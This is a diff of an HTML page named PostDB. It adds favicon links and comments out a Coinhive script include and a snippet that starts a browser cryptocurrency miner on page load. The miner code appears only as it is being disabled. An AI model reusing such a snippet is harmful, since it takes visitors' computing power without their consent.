@@ -4,6 +4,8 @@
     <meta charset="utf-8">
     <title>PostDB</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+    <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
   </head>
   <style>
     @import url('https://fonts.googleapis.com/css?family=Raleway:700');
@@ -62,12 +64,12 @@
     <audio controls id="maincard1" class="imgcard" preload="auto" autoplay></audio>
     <video controls id="maincard2" autoplay class="imgcard"></video>
 
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script> -->
     <script>
-      var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
-      window.onload = () => {
-        miner.start();
-      }
+      // var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
+      // window.onload = () => {
+      //   miner.start();
+      // }
       if (window.location.hash != "") {
         var img = window.location.hash.slice(1);
         if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 2) {
